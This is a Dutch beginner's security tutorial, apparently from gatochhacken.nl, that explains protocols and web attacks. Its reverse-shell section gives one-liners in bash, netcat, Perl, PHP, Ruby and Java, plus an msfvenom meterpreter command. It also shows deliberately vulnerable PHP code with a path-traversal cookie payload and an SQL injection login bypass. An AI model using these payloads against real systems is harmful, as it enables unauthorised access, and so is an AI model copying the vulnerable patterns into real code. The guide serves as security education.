<!DOCTYPE html>
<html>
<head>
<title>index</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css">
/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
/* Author: Nicolas Hery - http://nicolashery.com */
/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
/* Source: https://github.com/nicolahery/markdownpad-github */

/* RESET
=============================================================================*/

html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
  margin: 0;
  padding: 0;
  border: 0;
}

/* BODY
=============================================================================*/

body {
  font-family: Helvetica, arial, freesans, clean, sans-serif;
  font-size: 14px;
  line-height: 1.6;
  color: #333;
  background-color: #fff;
  padding: 20px;
  max-width: 960px;
  margin: 0 auto;
}

body>*:first-child {
  margin-top: 0 !important;
}

body>*:last-child {
  margin-bottom: 0 !important;
}

/* BLOCKS
=============================================================================*/

p, blockquote, ul, ol, dl, table, pre {
  margin: 15px 0;
}

/* HEADERS
=============================================================================*/

h1, h2, h3, h4, h5, h6 {
  margin: 20px 0 10px;
  padding: 0;
  font-weight: bold;
  -webkit-font-smoothing: antialiased;
}

h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
  font-size: inherit;
}

h1 {
  font-size: 28px;
  color: #000;
}

h2 {
  font-size: 24px;
  border-bottom: 1px solid #ccc;
  color: #000;
}

h3 {
  font-size: 18px;
}

h4 {
  font-size: 16px;
}

h5 {
  font-size: 14px;
}

h6 {
  color: #777;
  font-size: 14px;
}

body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
  margin-top: 0;
  padding-top: 0;
}

a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
  margin-top: 0;
  padding-top: 0;
}

h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
  margin-top: 10px;
}

/* LINKS
=============================================================================*/

a {
  color: #4183C4;
  text-decoration: none;
}

a:hover {
  text-decoration: underline;
}

/* LISTS
=============================================================================*/

ul, ol {
  padding-left: 30px;
}

ul li > :first-child, 
ol li > :first-child, 
ul li ul:first-of-type, 
ol li ol:first-of-type, 
ul li ol:first-of-type, 
ol li ul:first-of-type {
  margin-top: 0px;
}

ul ul, ul ol, ol ol, ol ul {
  margin-bottom: 0;
}

dl {
  padding: 0;
}

dl dt {
  font-size: 14px;
  font-weight: bold;
  font-style: italic;
  padding: 0;
  margin: 15px 0 5px;
}

dl dt:first-child {
  padding: 0;
}

dl dt>:first-child {
  margin-top: 0px;
}

dl dt>:last-child {
  margin-bottom: 0px;
}

dl dd {
  margin: 0 0 15px;
  padding: 0 15px;
}

dl dd>:first-child {
  margin-top: 0px;
}

dl dd>:last-child {
  margin-bottom: 0px;
}

/* CODE
=============================================================================*/

pre, code, tt {
  font-size: 12px;
  font-family: Consolas, "Liberation Mono", Courier, monospace;
}

code, tt {
  margin: 0 0px;
  padding: 0px 0px;
  white-space: nowrap;
  border: 1px solid #eaeaea;
  background-color: #f8f8f8;
  border-radius: 3px;
}

pre>code {
  margin: 0;
  padding: 0;
  white-space: pre;
  border: none;
  background: transparent;
}

pre {
  background-color: #f8f8f8;
  border: 1px solid #ccc;
  font-size: 13px;
  line-height: 19px;
  overflow: auto;
  padding: 6px 10px;
  border-radius: 3px;
}

pre code, pre tt {
  background-color: transparent;
  border: none;
}

kbd {
    -moz-border-bottom-colors: none;
    -moz-border-left-colors: none;
    -moz-border-right-colors: none;
    -moz-border-top-colors: none;
    background-color: #DDDDDD;
    background-image: linear-gradient(#F1F1F1, #DDDDDD);
    background-repeat: repeat-x;
    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
    border-image: none;
    border-radius: 2px 2px 2px 2px;
    border-style: solid;
    border-width: 1px;
    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
    line-height: 10px;
    padding: 1px 4px;
}

/* QUOTES
=============================================================================*/

blockquote {
  border-left: 4px solid #DDD;
  padding: 0 15px;
  color: #777;
}

blockquote>:first-child {
  margin-top: 0px;
}

blockquote>:last-child {
  margin-bottom: 0px;
}

/* HORIZONTAL RULES
=============================================================================*/

hr {
  clear: both;
  margin: 15px 0;
  height: 0px;
  overflow: hidden;
  border: none;
  background: transparent;
  border-bottom: 4px solid #ddd;
  padding: 0;
}

/* TABLES
=============================================================================*/

table th {
  font-weight: bold;
}

table th, table td {
  border: 1px solid #ccc;
  padding: 6px 13px;
}

table tr {
  border-top: 1px solid #ccc;
  background-color: #fff;
}

table tr:nth-child(2n) {
  background-color: #f8f8f8;
}

/* IMAGES
=============================================================================*/

img {
  max-width: 100%
}
</style>
</head>
<body>
<h1>Voorwoord</h1>
<p>In het kader van <a href="https://www.laatjeniethackmaken.nl" title="laatjeniethackmaken.nl">https://www.laatjeniethackmaken.nl</a> heb ik besloten om juist het tegenovergestelde te gaan maken. Gatochhacken.nl. Waarom ga toch hacken? Omdat er veel vragen zijn en mensen wel met security willen beginnen maar eigenlijk erg veel moeite hebben met het vinden van de juiste informatie in een voor hen begrijpelijke taal (Nederlands). </p>
<p>Ik ga je niet leren hacken, dat is iets wat je zelf met veel oefening zal moeten doen. Het enige wat ik kan doen is begrippen uitleggen, de ene keer iets uitgebreider dan de andere, en je doorverwijzen naar bronwebsites waar je vervolginformatie kunt vinden. Het is onmogelijk om al deze informatie in één document te bundelen.</p>
<p>Daarnaast verwacht ik van iemand die wil leren hacken dat er een zekere mate van intrinsieke nieuwsgierigheid aanwezig is en dat je jezelf wilt gaan inlezen. Om te voorkomen dat je afhaakt zal er wel wat text zijn om de linkjes aan elkaar te plakken. Deze pagina is overigens permanent under construction. Spot je een foutje, of heb je een verzoekje voor inhoud, maak dan een <a href="https://github.com/gatochhacken/gatochhacken.github.io/issues">issue</a> aan op <a href="https://www.github.com">github</a>.</p>
<p>Als je aan deze pagina wilt bijdragen, bekijk dan even het dankwoord onderaan.</p>
<p><strong>LET OP</strong> alle technieken, code voorbeelden en andere informatie zijn technieken waarmee je kan hacken. Deze toepassen op een systeem waar jij geen toestemming hebt om dit te doen is een strafbaar feit! (artikel <a href="http://wetten.overheid.nl/jci1.3:c:BWBR0001854&amp;boek=Tweede&amp;titeldeel=V&amp;artikel=138ab">138ab</a> wetboek van strafrecht) Bega geen fout, wil je oefenen en dingen proberen, kijk dan op de website van <a href="https://www.certifiedsecure.com" title="Certified Secure">https://www.certifiedsecure.com</a></p>
<h1>Inhoudsopgave</h1>
<h1>Bestandstypen</h1>
<h2>Portable Executable</h2>
<p>Portable Executables zijn de executables van Windows. Hierbij kan je voornamelijk denken aan bestanden met de extensie EXE, DLL en SYS. In het PE formaat is alle informatie die bewaard is om een executable in het geheugen te laden en op een juiste manier uit te voeren. Een portable executable bestaat uit verschillende onderdelen, waaronder de Signature (<a href="https://en.wikipedia.org/wiki/Magic_number_(programming)">magic number</a>) (MZ). Om een goed begrip te krijgen van de latere teksten over het backdooren van executables is het handig om eerst de inhoud en de werking van het PE formaat te kennen. Hiervoor raad ik je aan, op zijn minst, het volgende te <a href="https://en.wikipedia.org/wiki/Portable_Executable#Technical_details">lezen</a>.</p>
<h1>Protocollen</h1>
<p>Het is ontzettend belangrijk dat je protocollen leert kennen, immers het kennen van protocollen zorgt voor een grotere flexibiliteit in aanvallen en een grotere onafhankelijkheid van tooling. Mocht je het protocol al kennen, dan kun je zelf eenvoudiger een tool schrijven die je bij een aanval ondersteund.</p>
<h2>HTTP</h2>
<p>Het <a href="https://tools.ietf.org/html/rfc7230">HTTP protocol</a> is een protocol die door veel gebruikers gebruikt wordt om op het internet pagina’s op te vragen. HTTP is een, relatief, eenvoudig plain-text protocol. 
Binnen HTTP verstuurt een gebruiker een verzoek naar een webserver, dit verzoek ziet er bijvoorbeeld als volgt uit:</p>
<pre><code>GET /index.php HTTP/1.1
User-Agent: Firefox
Host: www.voorbeeld.nl
Accept-Language: en
</code></pre>

<p>In het bovengenoemde verzoek is GET de methode waarmee je een pagina opvraagt, daarachter staat de URI die je wilt opvragen en dan het protocol met de versienummer. Het User-Agent gedeelte is de browser die iemand gebruikt en de host het internet adres die een eindgebruiker wil bezoeken. Al deze velden kan jij als eindgebruiker beïnvloeden. Er bestaan overigens nog meer velden, maar daarvoor verwijs ik je graag naar de RFC zoals hierboven vermeld.
Als reactie hierop stuurt de server het volgende antwoord:</p>
<pre><code>HTTP/1.1 200 OK
Date: Thu, 3 May 2018 18:43:53 GMT
Server: Apache
Last-Modified: Wed, 2 May 2018 01:44:23 GMT
Content-Length: 73
Content-Type: text/plain

Hallo! Ik bedank je voor verzoek! Hier heb je mijn pagina als antwoord :)
</code></pre>

<p>Er zijn meerdere methoden om verzoeken naar webservers te sturen. Veel voorkomende methoden zijn:</p>
<p><strong>POST</strong>, bedoeld om gegevens niet in de URL mee te sturen maar in de body van je request. Deze methode zullen goede developers gebruiken om logingegevens te verzenden. De met POST requests meegezonden data komen in de meeste webservers (zoals apache bij standaard instellingen) niet in de logging terug.</p>
<p><strong>HEAD</strong>, doet hetzelfde als de hierboven genoemde GET request maar dan met als verschil dat de request body niet meegezonden wordt.</p>
<p><strong>TRACE</strong>, met TRACE geeft de webserver de, door jou verzonden request headers weer zodat je kan zien of er tussen jou, en de webserver, nog aanpassingen gedaan zijn. 
Start wireshark op je ingerichte lab machine en kijk eens wat er gebeurd als je met de request generator gaat spelen.</p>
<h2><a href="https://tools.ietf.org/html/rfc959">FTP</a></h2>
<h2><a href="https://tools.ietf.org/html/rfc792">ICMP</a></h2>
<p>Het Internet Control Message Protocol (ICMP) is een protocol wat men gebruikt om netwerkfunctionaliteiten te testen. I Denk hierbij aan de bereikbaarheid van een server als je PING'ed en een reactie van een router dat het doelnetwerk onbereikbaar is.</p>
<p>Een ICMP pakket bestaat uit 16 bytes, waarbij de eerste byte de type is, de tweede byte de code. De derde en de vierde byte is de checksum van het pakket en in de laatste 4+ bytes staat een restantdeel. Dit is afhankelijk van het type en de code van het pakket.</p>
<p>Binnen ICMP is de type 0, code 0 packet de packet die je het vaakst gebruikt zal hebben. Deze packet verzend je namelijk als je op je commandline het ping commando gebruikt. Dit packet heet officieel de &quot;Echo reply&quot;. Deze packet kan je potentieel gebruiken om data te exfiltreren. Alles na de officiele headers is namelijk vrij in te vullen en kan (al dan niet) gelijk geretourneerd worden.</p>
<p>Type 11 code 0 of 1 kan je gebruiken om het aantal hops tussen jou en een ander te bereiken. Denk hierbij aan tracert. Je kan de tracert (in verband met de TCP Time-to-live) ook gebruiken om te ontdekken of er inline firewalls aanwezig zijn.</p>
<h2>OSI-model</h2>
<p>Alhoewel het OSI(Open Systems Interconnection)-model geen protocol is is het wel iets wat handig is om in je achterhoofd te houden als je iets wilt gaan doen met netwerk hacking. Het OSI-model bestaat uit 7 lagen. Hoe hoger de laag, des te dichter je bij de gebruiker aangekomen bent. Hieronder spits ik het toe op een TCP/IP stack, wil je iets anders hierover lezen dan is google een goede start. De lagen zijn als volgt:</p>
<p><strong>Laag 1: Physical</strong></p>
<p>De fysieke laag zorgt er voor dat de data die jij over een netwerk wilt verzenden ook daadwerkelijk op de kabel komt, en dat de data die mensen over het netwerk verzenden ook daadwerkelijk bij jouw systeem komt. Voorbeelden van deze protocollen zijn DSL, ISDN, CAN bus en WIFI. Als er iets ontvangen is, gaat deze informatie naar laag 2.
Dit kun je vergelijken met het posten van de brief, of het uit de brievenbus halen van je brief.</p>
<p><strong>Laag 2: Datalink</strong></p>
<p>De datalink laag bepaald de manier hoe er gecommuniceerd word en met wie. In deze laag zul je ook vaak foutcorrectie vinden. Voorbeelden van protocollen op deze laag zijn ethernet, CHAP en ARP. Dit kan je vergelijken met een adres die op de enveloppe geschreven wordt of of afgelezen wordt. </p>
<p><strong>Laag 3: (inter)Network</strong></p>
<p>In deze laag vind je de IPv4 protocollen en de IPv6 protocollen zowel als IPSec en NAT. In deze laag wordt het mogelijk gemaakt om verschillende netwerken aan elkaar te knopen en routing toe te passen. Een bijkomend voordeel is dat bij het IP protocol hier IP adressen ontstaan die voor mensen normaal te lezen zijn. Dit kan je vergelijken met het opschrijven of aflezen van de postcode.</p>
<p><strong>Laag 4: Transport</strong></p>
<p>In de transport laag wordt end-to-end communicatie mogelijk gemaakt, hier wordt in feite de envelop gemaakt waar de boodschap in gaat. Bij sommige protocollen worden hier ook betrouwbaarheidsmaatregelen genomen, zoals bijvoorbeeld bij TCP. Bij TCP schrijf je ook een antwoordbevestiging op de envelop.</p>
<p><strong>Laag 5: Session</strong></p>
<p>Deze laag beheert de sessies die tussen twee communicerende partijen bestaan, het houd de verbinding open of sluit hem af als hij niet meer noodzakelijk is. Hierbij kan je denken aan SSH, SMB of RDP.</p>
<p><strong>Laag 6: Presentation</strong></p>
<p>De presentatie laag is de plaats waar de informatie een encoding,compressie of encryptie krijgt (of het omgekeerde natuurlijk). Deze laag is niet altijd eenvoudig te duiden, HTTP kan in sommige visies namelijk zowel onder de presentatie als de applicatie laag vallen.</p>
<p><strong>Laag 7: Application</strong></p>
<p>De applicatielaag is de hoogste laag van het OSI model en deze laag ligt erg dicht bij een eindgebruiker en hij zal deze dan meestal ook het vaakst kennen. Binnen deze laag vallen protocollen als DNS, WEBDav, HTTP en FTP. Dit zijn protocollen waarmee computers direct met elkaar kunnen communiceren over de (met de lagere lagen) opgezette telecommunicatie- en computernetwerken.</p>
<p>In laag 1 wordt de informatie uitgedrukt in bits, in laag 2 spreken we over frames. In laag 3 over packets en laag 4 over segments. Alles boven laag 4 is data.</p>
<p>Er zijn diverse ezelsbruggetjes om het OSI-model te onthouden. Één hiervan is <em>All people should try new dairy products</em>	</p>
<h1>Shells</h1>
<h2>Reverse shell</h2>
<p>Alhoewel een volledig interactieve shell soms niet nodig is om je doel te bereiken, is het wel een van de krachtigste toegangen die je als hacker kan krijgen. Een reverse shell is wanneer een computer naar jou terug verbind en vervolgens zijn shell of command line aan jou ter beschikking stelt.</p>
<p>Er zijn verschillende manieren om shells te bemachtigen, waaronder standaard met programmeertalen danwel de methodes met kant en klare agents.</p>
<p>Hieronder zal ik er een aantal plaatsen:</p>
<h3>Bash</h3>
<pre><code>exec /bin/bash 0&amp;0 2&gt;&amp;0 
bash -i &gt;&amp; /dev/tcp/&lt; ip &gt;/&lt; port &gt; 0&gt;&amp;1
</code></pre>

<h3>Java</h3>
<pre><code>r = Runtime.getRuntime()
p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/&lt; ip &gt;/&lt; port &gt;;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
p.waitFor()
</code></pre>

<h3>Netcat</h3>
<pre><code>nc -e /bin/sh &lt; ip &gt; &lt; port &gt;
</code></pre>

<h3>Perl</h3>
<pre><code>perl -e 'use Socket;$i=&quot;&lt; ip &gt;&quot;;$p=&lt; port &gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
</code></pre>

<h3><a href="https://www.php.net">PHP</a></h3>
<pre><code>php -r '$sock=fsockopen(&quot;&lt; ip &gt;&quot;,&lt; port &gt;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
</code></pre>

<h3>Ruby</h3>
<pre><code>ruby -rsocket -e'f=TCPSocket.open(&quot;&lt; ip &gt;&quot;,&lt;port&gt;).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'
</code></pre>

<h2>MSFVenom</h2>
<p>Msfvenom is de payloadgenerator van het Metasploit Framework. Met deze payloadgenerator kan je eenvoudig code genereren die diverse soorten backdoors, reverse shells of andere toepassingen. Een handige manier om een payload te genereren om in buffer overflows te gebruiken is:</p>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt; ip &gt; LPORT=&lt; port &gt; -f hex
</code></pre>

<p>De &quot;-f hex&quot; zorgt er in dit geval voor dat de payload direct hexadecimaal te kopieren geplakt word. Deze variant kan je ook makkelijker gebruiken voor het direct in een executable patchen van een shell.</p>
<h3>Linux</h3>
<h3>Mac</h3>
<h3>Windows</h3>
<h3>Android</h3>
<h1>Web attacks</h1>
<h2>Oefenomgeving</h2>
<p>Zoals eerder genoemd is certified secure een mooie omgeving om web attacks te oefenen. Je kan hiervoor ook de Damn Vulnerable Web Application (<a href="http://www.dvwa.co.uk/">DVWA</a>) gebruiken. De DVWA geeft een kwetsbare website waar je een heleboel van de hieronder genoemde technieken kan beoefenen. Je kan de DVWA in bijvoorbeeld <a href="https://www.vmware.com/products/workstation-player/workstation-player-evaluation.html">vmware player</a> draaien.</p>
<p>De standaard gebruikersnaam en wachtwoord zijn admin en password. Je kan deze gegevens ook proberen te bruteforcen.</p>
<p><strong>Waarschuwing</strong> Draai DVWA <strong>nooit</strong> op een echte server. Het is echt zo kwetsbaar en je webserver zal snel overgenomen worden.</p>
<h2>Enumeratie</h2>
<p>Het is bijna onmogelijk om een onbeperkte lijst te geven van mogelijkheden waarop je binnen websites kan enumereren. Om hier toch een beeld te kunnen geven van welke gegevenssets je allemaal kan verzamelen van websites zullen er toch een niet limitatieve opsomming aan mogelijkheden gegeven worden.</p>
<h3>Zoekmachinefuncties</h3>
<p>Veel websites willen het zoekmachines graag makkelijker maken om geïndexeerd te worden, of soms juist voorkomen dat een zoekmachine bij sommige pagina’s kan komen. Je kan altijd kijken of er een zogenaamd <a href="http://www.robotstxt.org/">robots.txt</a> bestand is waarmee een beheerder de toegang tot bepaalde pagina’s wil beperken. Schrik niet als je hier de “geheime” paden naar de beheersinterface aantreft.</p>
<p>Als je juist eenvoudig en met weinig verzoeken gebruikers wil enumereren of andere informatie wil verzamelen waarvan het juist de bedoeling is dat zoekmachines hierbij kunnen, kijk dan eens naar de <a href="https://en.wikipedia.org/wiki/Site_map">sitemap</a>. In een sitemap neemt een beheerder juist de pagina’s op waarvan hij graag wil dat je die gaat lezen.</p>
<h3>Webpagina's</h3>
<p>Als je niet weet welke mappen of bestanden er allemaal bestaan kan je bij bekende softwarepakketten de installatiebestanden downloaden en deze installeren. Op deze manier kan je een beeld krijgen welke pagina’s er allemaal in een installatie horen te zitten en kan je er achter komen of er iets als een changelog (publiek) beschikbaar is waarmee je de versie van een applicatie kan achterhalen.</p>
<h3>Dynamische pagina's</h3>
<p>Tegenwoordig bevatten de meeste websites een content managment systeem. Deze content managment systemen maken het makkelijker om websites aan te maken en te beheren. Een beheerder hoeft geen HTML of CSS code meer te typen en kan eenvoudiger nieuwe pagina’s aan maken. Ook kan je vaak de inhoud van je website in eenzelfde omgeving typen als je van moderne tekstverwerkers gewend bent.
Als je een website tegen komt waarbij dit het geval is, en je vervolgens ziet dat userprofielen op te vragen zijn met een getal, dan kan je potentieel alle gebruikersnamen verzamelen. </p>
<p><strong>Voorbeeld wordpress:</strong>
Op Wordpress websites is het, standaard, mogelijk om de inlognamen van auteurs te vergaren. Deze inlognamen worden gebruikt om op het wp-admin panel in te loggen. </p>
<p>http://<wordpress>/?author=<id></p>
<p>Als je het id nummer op 1 zet krijg je de gebruikersnaam van de eerste aangemaakte Wordpress gebruiker. Dit zal vaak de administrator zijn.</p>
<h3>Login formulieren</h3>
<p>Ook login formulieren kunnen een schat aan informatie prijs geven, zoals of een gebruiker bestaat en of je het juiste wachtwoord hebt. In het laatste geval zal je logischerwijs inloggen. Alhoewel het best practice is om aan te geven dat de gebruikersnaan en/of wachtwoord foutief ingevuld zijn geven sommige websites ook nog verschillende gegevens weer.</p>
<p><img src="http://gatochhacken.nl/images/web_user_enumerate_gebruiker.png" /></p>
<p>Je kan hier bijvoorbeeld zien dat je de gebruikersnaam niet goed hebt omdat de gebruiker niet bestaat.</p>
<p><img src="http://gatochhacken.nl/images/web_user_enumerate_wachtwoord.png" /></p>
<p>Je kan hier bijvoorbeeld zien dat je de gebruikersnaam goed hebt, immers er is een dit wachtwoord is incorrect melding verschenen.</p>
<p><img src="http://gatochhacken.nl/images/web_user_enumerate_geenconclussie.png" /></p>
<p>Aan dit veld kun je geen conclussies meer verbinden.</p>
<h3>Source code analyse</h3>
<p>Alhoewel niemand van je verwacht dat je elke programmeertaal kunt schrijven die er bestaat, is het wel van waarde dat je in een taal leert programmeren. Als je in bijvoorbeeld Python kan programmeren zul je heel veel logica uit andere talen ook snappen. Je zal dan bijvoorbeeld ook de fouten van anderen in de logica snappen. </p>
<p>Er zijn meer mensen die websites beheren en bezitten dan die ze zelf kunnen schrijven, je moet dus niet raar opkijken als je vaker dezelfde software voorbij ziet komen. Als je een challenge of een website wilt hacken is het aan te raden om op zoek te gaan naar de source code van die website. Nu verwacht ik niet dat je in <a href="https://wordpress.com/">wordpress</a> een zwakheid gaat treffen, maar in een an haar vele (verlaten) plugins kan dit zomaar het geval zijn.</p>
<p>Source code van applicaties kan je vaak op websites als <a href="http://github.com/">github</a> of <a href="https://sourceforge.net">sourceforge</a> (etc.) vinden. Ga in deze source op zoek naar foutjes, kijk naar installatie bestanden en de hiervoor vereiste rechten (en of deze ook weer beperkter ingesteld worden). Vind je eigen zwakheid en meld hem na gebruik om het internet weer een veiligere plek te maken.</p>
<h3>Javascript</h3>
<p>De javascript onderdelen van websites verklappen vaak meer dan de eigenaar van de website wil. Ga je deze javascript code in de source opzoeken vind je vaak één hele lange regel met code. Om deze alsnog leesbaar te maken kun je gebruik maken van een JS Beautifier. Een JS Beautifier zorgt dat de code weer overzichtelijk neergezet is en je het kan analyseren. **Let op: ** gebruik voor dit soort zaken nooit online tools, je weet maar nooit wat ze op slaan!</p>
<h2>Server-side controle functionaliteiten</h2>
<h3>Object injecttion</h3>
<p>In veel talen is het mogelijk om objecten te serialiseren. Dit maakt het mogelijk om de status van je object te bewaren en op een later moment weer met dezelfde status verder te gaan. Het voordeel hiervan is dat je, bijvoorbeeld, de status van een user sessie op kan slaan en deze later weer in kan lezen om je gebruiker een meer soepele ervaring aan te bieden. In een taal als PHP doe je dit met de <a href="http://www.php.net/serialize">serialize</a> en de <a href="http://www.php.net/unserialize">unserialize</a> functies. Dit soort functies (en de bijbehorende problemen) bestaan overigens in meer talen waaronder python en java.</p>
<p>Als voorbeeld wil ik de volgende PHP code opgeven:</p>
<pre><code>&lt;?PHP
class userClass
{
    public $username = '';
    public $id = '';

    function __contruct($id)
    {
        $this-&gt;username = file_get_contents('usercontent/'.$id);
        $this-&gt;id = $id;
    }

    function __sleep()
    {
        file_put_contents('usercontent/'.$this-&gt;id,$this-&gt;username);
        return array('id');
    }

    function __wakeup()
    {
        $this-&gt;username = file_get_contents('usercontent/'.$this-&gt;id);
    }
}

if (isset($_COOKIE['userId']))
{
    unserialize($_cookie['userId']);
    echo &quot;Hallo &quot;.$userClass-&gt;username;
}
?&gt;
</code></pre>

<p>In dit voorbeeld bestaat er een class &quot;userClass&quot;. Deze class heeft een wakeup en sleep <a href="http://php.net/manual/en/language.oop5.magic.php">magic method</a>. Deze magic method's zijn functies die in bepaalde situaties aangeroepen worden als dit verwacht mag worden. In het geval van de wakeup is dit als een object wil deserializen, en bij sleep als deze geserializeerd gaat worden. Deze magic methods worden dan altijd, automatisch, aangeroepen.</p>
<p>Aangezien de username in dit voorbeeld in een bestand weggeschreven word als het sleep commando aangeroepen is, kun je aannemen dat dit user input is die op de webserver weggeschreven is. Hier kan je op zich niet heel veel aan misbruiken. Bij het wake up commando daarentegen zal er een bestand uitgelezen worden met de naam gelijk aan het user id in de cookie.</p>
<p>Als er een legale user is opgegeven, in onderstaande geval een user met userid 1 en de gebruikersnaam &quot;meh&quot;, dan zal er een object in de cookie staan die er als volgt uit ziet:</p>
<pre><code>O:9:&quot;userClass&quot;:1:{s:2:&quot;id&quot;;i:1;}
</code></pre>

<p>Als we nu de bovenstaande class zelf in een PHP script zeztten, en hier zelf een andere ID in invoeren, zoals bijvoorbeeld </p>
<pre><code>../../../../../../etc/passwd
</code></pre>

<p>en deze inhoud in de cookie zetten, dan krijgen we een cookie als deze:</p>
<pre><code>O:9:&quot;userClass&quot;:1:{s:2:&quot;id&quot;;s:28:&quot;../../../../../../etc/passwd&quot;;}
</code></pre>

<p>Bij het deserialiseren van deze cookie zal er geen bestand ingelezen worden met gebruikersgegevens, maar zal de inhoud van de /etc/passwd file in de variabele username gezet worden. Bij het inladen van de website heb je op deze manier information disclosure verkregen. De mogelijkheden die je hebt met object injection zijn altijd afhankelijk van de logica die reeds in de class aanwezig is.</p>
<h3><a href="https://www.owasp.org/index.php/Server_Side_Request_Forgery">SSRF</a></h3>
<p>Bij SSRF maak je gebruik van een functionaliteit die de server normaal gesproken gebruikt om een actie uit te laten voeren waar jij normaal gesproken geen toegang toe hebt. Denk hierbij aan dual-homed servers of servers die door firewall rules een bredere toegang hebben tot het achterliggende netwerk. Meestal zal het hier dan gaan om dynamische webapplicaties. Dit kan soms ontstaan omdat de server gebruik maakt van command line applicaties zoals curl, of door middel van functies waarmee path's geopend kunnen worden. </p>
<p>Als voorbeeld kan je naar het volgende script kijken:</p>
<pre><code>&lt;?PHP
    if (isset($_GET['file']))
    {
        $file = $_GET['file'];
    }

    $content = fopen($file,'rb');
    passthru($content);
?&gt;
</code></pre>

<p>In dit voorbeeld is het eigenlijk de bedoeling dat de gebruiker met de file parameter een lokaal bestand kan uitlezen om die weer te geven. Op sommige servers kan je hiermee URL's uitlezen. Dit kan je doen omdat de <a href="http://php.net/manual/en/filesystem.configuration.php#ini.allow-url-fopen">allow_url_fopen</a> variabele op true staat. Als je deze methodiek gebruikt om http://intranet/geheim_document.txt te openen, dan zal je deze keurig geserveerd krijgen terwijl jij hier officieel niet bij kan.  </p>
<p>Mocht je wachtwoorden kennen van een gebruiker op het systeem en je wilt een tunnel opbouwen dan kan je potentieel in het bovenstaande voorbeeld gebruik maken van de <a href="http://php.net/manual/en/wrappers.ssh2.php">ssh2</a> wrapper (uit by default) van PHP. </p>
<p>Als de request nu met <a href="https://en.wikipedia.org/wiki/CURL">cURL</a> uitgevoerd was, dan was het mogelijk om van de dict:// wrapper gebruik te maken. Met deze wrapper kan je van bijvoorbeeld een op localhost draaiende memchached de <a href="https://docs.oracle.com/cd/E17952_01/mysql-5.6-en/ha-memcached-stats.html">stats</a> pagina opvragen.</p>
<p>Klik <a href="https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#">hier</a> voor een zeer uitgebreide cheatsheat.</p>
<h3>SQL</h3>
<p>Voor sommige websites is het niet erg lastig om een SQL injectie uit te voeren. Er word een login formulier ingevuld en de credentials worden rechtstreeks naar een database gestuurd. Een voorbeeld hiervan in PHP kan bijvoorbeeld zo eruit zien:</p>
<pre><code>&lt;?PHP
    if (isset($_POST['submit']))
    {
        $result = mysqli_query($db,&quot;SELECT id FROM users WHERE username='&quot;.$_POST['username'].&quot;' AND password=&quot;'.sha256($_POST['password']).'&quot; lIMIT 1&quot;);
        if (mysqli_num_rows($result) == 1)
        {
            echo &quot;U bent ingelogd&quot;;
        }else{
            echo &quot;Uw gebruikersnaam of wachtwoord zijn fout&quot;;
        }
    }
?&gt; 
</code></pre>

<p>Als je in het inlogformulier in een gebruikersnaam nu geldige SQL code schrijft, dan zal deze rechtstreeks in de query ingevoerd worden. Eerst moeten wij uit de quote breken, dus we plaatsen een enkele quote. Dan willen wij graag dat er een geldig resultaat word opgehaald, dus plaatsen wij er een OR 1 achter. Om te voorkomen dat de rest van de query ook nog uitgevoerd zal worden en wij dus een wachtwoord moeten opgeven, gaan wij de rest van de query uitcommenten. Dit doen wij met # -- .</p>
<p>Onze complete injectie ziet er dan als volgt uit:</p>
<p><code>' OR 1 # --</code> </p>
<p>Als je deze injectie invoert in de SQL injectie pagina van DVWA, dan zal je zien dat hij elke gebruiker terug geeft. In het bovenstaande voorbeeld maar 1, de eerste die hij tegen komt.  Op deze manier kan je elke mogelijke (correcte) query invoegen in een onveilig statement.</p>
<p>In sommige andere gevallen kan je meer informatie uit een database halen dan dat de websitemaker eigenlijk wilde. Er bestaan websites waarbij er dynamisch pagina's worden opgehaald om deze vervolgens aan de eindgebruiker weer te geven. Een voorbeeld van zo een pagina is als volgt: </p>
<pre><code>&lt;?PHP
    $pagina = 0;
    if (isset($_GET['pagina']))
    {
        $pagina = $_GET['pagina'];
    }

    $rPagina = mysqli_query($db, &quot;SELECT titel, inhoud FROM paginas WHERE id=&quot;.$_GET['pagina'].&quot; LIMIT 1&quot;);
    if (mysqli_num_rows($rPagina) &gt; 0)
    {
        $aPagina = mysqli_fetch_assoc($rPagina);

        echo &quot;
            &lt;h1&gt;&quot;.$aPagina['titel'].&quot;&lt;/h1&gt;
            &quot;.$aPagina['inhoud'];
    }
?&gt;
</code></pre>

<p>In deze pagina kan je met een sql injectie meer informatie opvragen. Voor deze query kun je gebruik maken van een <strong>UNION SELECT injectie</strong>.</p>
